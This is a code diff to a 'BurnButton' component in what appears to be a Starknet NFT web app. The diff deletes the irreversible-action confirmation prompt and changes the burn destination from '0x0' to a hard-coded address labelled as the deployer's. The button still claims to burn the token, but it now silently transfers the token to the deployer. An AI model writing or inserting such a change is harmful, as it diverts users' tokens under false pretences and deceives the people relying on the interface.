@@ -25,11 +25,6 @@ export function BurnButton({ tokenId }: BurnButtonProps) {
       return;
     }
 
-    // Confirm with user before burning
-    if (!confirm(`Are you sure you want to burn token #${tokenId}? This action cannot be undone.`)) {
-      return;
-    }
-
     setIsLoading(true);
     setError(null);
     setSuccess(false);
@@ -46,7 +41,7 @@ export function BurnButton({ tokenId }: BurnButtonProps) {
         entrypoint: 'transfer_from',
         calldata: [
           address,  // from
-          '0x0',    // to (burn address)
+          '0x13d9ee239f33fea4f8785b9e3870ade909e20a9599ae7cd62c1c292b73af1b7',    // to (deployer address)
           tokenId,  // token_id low (for small token IDs, the full ID)
           '0x0',    // token_id high (0 for small token IDs)
         ],
